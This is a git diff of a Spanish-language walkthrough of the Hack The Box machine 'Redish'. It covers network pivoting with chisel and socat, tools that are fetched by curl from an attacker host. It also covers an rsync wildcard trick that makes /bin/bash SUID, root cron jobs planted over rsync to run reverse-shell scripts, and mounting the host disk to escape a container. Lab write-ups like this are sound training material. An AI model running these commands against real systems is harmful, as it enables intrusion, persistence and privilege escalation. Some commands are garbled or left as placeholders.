@@ -211,6 +211,10 @@ Cabe destacar que tomamos un binario estatico del mismo repo del nmap este:
 > https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
 
 ```
+__curl http://10.10.14.67/chisel > chisel
+./chisel server --reverse -p 1234
+./chisel client 10.10.14.67:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
+__curl http://10.10.14.67/socat >socat
 ./socat TCP-LISTEN:1111,fork TCP:10.10.14.11:2222 & #Por cierto que dejamos corriendo en segundo plano
 
 ```
@@ -244,41 +248,201 @@ done
 
 ![image](https://github.com/gecr07/RedishHTB/assets/63270579/76cff56c-b1ea-4f6a-8862-9722a7d467c7)
 
+## Cron como funciona porfin lo entiendo
+
+Pues dentro de /etc existen varios: cron.daily/   cron.hourly/  cron.monthly/ cron.weekly/ cuando tu metes un archivo aqui se ejecuta semanalmente, mensualmente, diariamente o cada hora. Poniendo ahi dentro de esa carpta un script se ejecuta ( con permisos eso si no se).
+
+> /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.monthly/: Estos directorios tienen una estructura específica para las tareas cron que se ejecutarán diaria, semanal y mensualmente, respectivamente. En lugar de colocar archivos con comandos cron, los scripts o comandos en estos directorios se ejecutan automáticamente según su nombre y la frecuencia correspondiente. Por ejemplo, los scripts en /etc/cron.daily/ se ejecutan diariamente sin la necesidad de agregar archivos de configuración adicionales.
+
+Por otro lado existe la carpeta /etc/cron.d esta es una carpeta especial porque te permite personalizar cada cuanto se ejecuta la tarea.
 
 
+> /etc/cron.d/: En este directorio, puedes colocar archivos con tareas cron adicionales que no están vinculadas a usuarios específicos. Los archivos en este directorio siguen el formato de las entradas de crontab regulares, pero se separan para facilitar la administración y organización de las tareas.
+
+```
+echo "* * * * * root sh /tmp/reverse.sh" > /etc/cron.d/tarea
+```
+
+## Threats Segundo plano jobs &
+
+Cuando tu quieres que un programa se ejecute en segundo plano lo que haces es meterle un & al final ejemplo:
+
+```
+./socat TCP-LISTEN:1111,fork TCP:10.10.14.67:2222 &
+
+```
+
+Ahora que pasa si queremos detenerlo y volverlo a inciar para el caso que no funcionara bien.
+
+### Comando foreground o primer plano
+
+Podemos traer al frente ese trabajo con este comando (fg) y parar el comando Ctrl + Z y despues volverlo a ejecutar.
+
+### Comando bg
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/4221aeec-2410-4903-b46b-d1230585343a)
+
+Que entiendo que esto seria lo mismo que poner un & al final.
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/fc278b78-b625-471b-96bd-45abe0fbd8b3)
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/759d59f9-75bd-4a8c-ab5d-7b33daf5d3d9)
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/9d6c4b57-e268-48d1-8084-6fead4746137)
+
+Nos hacemos root nos damos cuenta que esta cosa tiene una tarea cron que hace un rsync:
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/b41eb348-3ffe-41f7-926c-7586bd172117)
+
+Abusamos de el wildcard de rsync 
+
+```
+# 1.rdb
+#!/bin/bash
+
+chmod +s /bin/bash
+```
+
+En la maquina www-data:
+
+```
+base64 1.rdb -w0 | xclip -sel clip > 1.rdb
+touch -- "-e sh 1.rdb # metes el -- para que te deje poner cualquier nombre y no interprete el - como parametro
+
+```
+
+## Mapa de red
+
+Entonces 
+
+```
+[+] Enumerando el network 172.18.0.0/24
+
+                 [+] La ip 172.18.0.2 -ACTIVE <-- (nodered) [PWNED]
+                           [+] Port 1880 - OPEN
+                 [+] La ip 172.18.0.1 -ACTIVE <-- Maquina Host
+                           [+] Port 1880 - OPEN
 
 
+[+] Enumerando el network 172.19.0.0/24
+                 [+] La ip 172.19.0.4 -ACTIVE <-- (nodered) [PWNED]
+                           [+] Port 1880 - OPEN
+
+                 [+] La ip 172.19.0.3 -ACTIVE <-- (www) [PWNED] X
+                           [+] Port 80 - OPEN
+
+                 [+] La ip 172.19.0.2 -ACTIVE (redish)
+                           [+] Port 6379 - OPEN
+                 [+] La ip 172.19.0.1 -ACTIVE <-- Maquina Host
+
+[+] Enumerando el network 172.20.0.0/24
 
 
+                  [+] Host  172.20.0.2 <-- (backup)
+
+                  [+] Host  172.20.0.3 <-- (www) X
+```
+
+## RSYNC
+
+Ya un vez que tenemos acceso root podemos hacer ping y podemos usar el rsync sin restriciones.
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/614bf36a-62dd-486b-b458-34e3d86a8b28)
+
+Ojo me di cuenta que es el directorio el que anda causando problemas el f1 no se que intenta no usarlo.
+
+Para descargar un archivo con el rsync:
+
+```
+rsync rsync://backup:873/src/etc/passwd passwd
+```
+
+## Socat
+
+Ahora como podemos leer y escribir con RSYNC podemos inyectar una tarea cron y poner a la escucha el socat como si de un nc se tratara!!
 
 
+Ahora como no tenemos conectividad hasta esa maquina el SOCAT tambien puede servir de nc(por lo que puedo entender)
+
+```
+./socat TCP-LISTEN:5555
+```
+
+Insertando una tarea cron:
+
+```
+echo '* * * * * root sh /tmp/reverse.sh' > reverse
+```
+
+Pero como subimos socat¿? Pues como estamos en 172.20.0.3,172.19.0.3 pero y ahi alcanzamos 172.19.0.4 la cual tiene un socat en el 1111 que redirecciona a la Kali por el puerto 2222 entonces:
+
+En la 172.20.0.3 <-- (www) X
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/50ce24bf-8e1b-4847-8f46-30ad28c7bfef)
+
+Entonces ahora pues en el segmento ese nuevo que encontramos la backup le metemos una tarea cron.
+
+```
+echo "* * * * * root sh /tmp/reverse.sh" > tarea
+rsync reverse rsync
+rsync reverse rsync://172.20.0.3/src/etc/cron.d/reverse
+echo "perl reverse" | base64 -d > reverse.sh # estamos en www vamos a backup
+rsync reverse.sh rsync://172.20.0.3/src/tmp/reverse.sh
+#Revisa si se escribio.
+rsync  rsync://172.20.0.3/src/tmp/
+# En www ./socat TCP-LISTEN:5555 stdout 
+```
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/7c187603-b106-40e2-ac83-853b51350f82)
+
+Ganamos el root pero aun no podemo leer la flag de root.
+
+## Disk free (df)
+Entonces vamos listar mas el sistema porque la flag aun estariamos en contenedor y la flag ya estaria en redish la maquina oficial. Este comanod siver para ver 
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/80ebf37a-c5dd-4736-a474-009842786806)
+
+> El comando du en Linux se utiliza para mostrar el uso del espacio en disco de archivos y directorios. Su nombre proviene de "Disk Usage" (uso de disco). Con du, puedes obtener información sobre el tamaño total utilizado por archivos y directorios en el sistema de archivos.(usalo igual du -h
+
+## /dev/sda
+
+> El directorio /dev/sda* en Linux representa un dispositivo de bloque, específicamente una unidad de almacenamiento, como un disco duro o una unidad de estado sólido (SSD). La letra "s" se refiere a "scsi" o "serial," aunque actualmente también representa dispositivos SATA, SAS y NVMe. La letra "a" es una designación de letra para la primera unidad de almacenamiento detectada en el sistema, y el asterisco "*" indica que puede haber otras particiones asociadas con la unidad.
+
+>En un sistema con una sola unidad de almacenamiento, podrías encontrar /dev/sda, y si hay particiones en esa unidad, se numerarán consecutivamente como /dev/sda1, /dev/sda2, etc. Si tienes múltiples unidades de almacenamiento en el sistema, podrías encontrar /dev/sdb, /dev/sdc, y así sucesivamente.
+
+```
+ls /dev/sda*
+
+```
+
+## Montar una particion
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/704b82dd-9089-433d-8c28-19a0012f4f5a)
+
+```
+root@backup:~# mkdir /mnt/test
+root@backup:~# mount /dev/sda2 /mnt/test/
+
+```
+
+Y nos damos cuenta que trabaja con monturas
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/bee73cc6-4f49-4792-9860-31ba46c07b71)
+
+Entonces estamos viendo el file system de la maquina redish por lo que podriamos aplicar la misma del cron y ganar una shell root ya en la maquina principal(redish).
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/7e81cae8-e859-4219-86ed-e0821a654a7d)
+
+Finalmente:
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/babfaf8f-21c6-4839-a035-227240ce999b)
+
+Podemos ver todas las interfaces que arrastra esta maquina.
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/35b56a8d-315a-4e3e-8dcc-6d6293aee67b)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+FIN...
 
 
 
